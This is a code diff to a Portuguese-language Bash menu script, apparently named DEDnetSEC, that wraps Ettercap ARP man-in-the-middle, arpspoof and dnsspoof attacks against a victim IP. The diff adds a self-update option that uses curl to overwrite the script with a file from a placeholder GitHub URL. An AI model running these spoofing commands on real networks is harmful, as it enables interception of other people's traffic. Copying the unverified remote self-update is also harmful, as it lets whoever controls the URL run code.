@@ -10,6 +10,9 @@ echo " |____/|_____|____/|____/|_____\\____|"
 echo "                                     "
 echo ""
 
+# URL do script atualizado (modifique para seu link real)
+URL_SCRIPT="https://raw.githubusercontent.com/seuusuario/seurepositorio/main/script.sh"
+
 # Função para checar e instalar pacotes necessários
 check_install() {
     local packages=("aircrack-ng" "dsniff" "ettercap-text-only" "arp-scan" "xterm" "net-tools" "pciutils")
@@ -77,7 +80,6 @@ mitm_ettercap() {
     echo -n "Digite o IP do roteador/gateway: "
     read ip_gateway
     sudo ettercap -T -i "$IFACE" -M arp:remote /"$ip_vitima"/ /"$ip_gateway"/
-    
 }
 
 # ARP Spoof com arpspoof
@@ -164,11 +166,28 @@ dns_spoof() {
 
     if [ -z "$ip_vitima" ]; then
         sudo dnsspoof -i "$IFACE" -f "$spoof_file"
-        python3 ascii.py "spoofing  "$ip_vitima" using "$IFACE" and file:"$spoof_file"" 
-
+        python3 ascii.py "spoofing  "$ip_vitima" using "$IFACE" and file:"$spoof_file""
     else
         sudo dnsspoof -i "$IFACE" -f "$spoof_file" host "$ip_vitima"
         python3 ascii.py "spoofing  "$ip_vitima" using "$IFACE""
+    fi
+}
+
+# Função para atualizar o script via curl
+atualizar_script() {
+    echo "DEDnetSEC - Atualizando script local..."
+    # Faz backup do script atual
+    cp "$0" "$0.bak"
+
+    # Baixa e substitui o script atual
+    curl -fsSL "$URL_SCRIPT" -o "$0"
+
+    if [ $? -eq 0 ]; then
+        echo "Script atualizado com sucesso."
+        echo "Reinicie o script para aplicar as mudanças."
+        exit 0
+    else
+        echo "Falha ao atualizar o script. Backup mantido em $0.bak"
     fi
 }
 
@@ -184,7 +203,8 @@ main_menu() {
         echo "5) MITM com Ettercap"
         echo "6) ARP Spoof"
         echo "7) DNS Spoof (dnsspoof)"
-        echo "8) Sair"
+        echo "8) Atualizar Script"
+        echo "9) Sair"
         echo "==============================="
         echo -n "Escolha uma opção: "
         read op
@@ -197,7 +217,8 @@ main_menu() {
             5) mitm_ettercap ;;
             6) arp_spoof ;;
             7) dns_spoof ;;
-            8) echo "Saindo..."; break ;;
+            8) atualizar_script ;;
+            9) echo "Saindo..."; break ;;
             *) echo "Opção inválida." ;;
         esac
     done
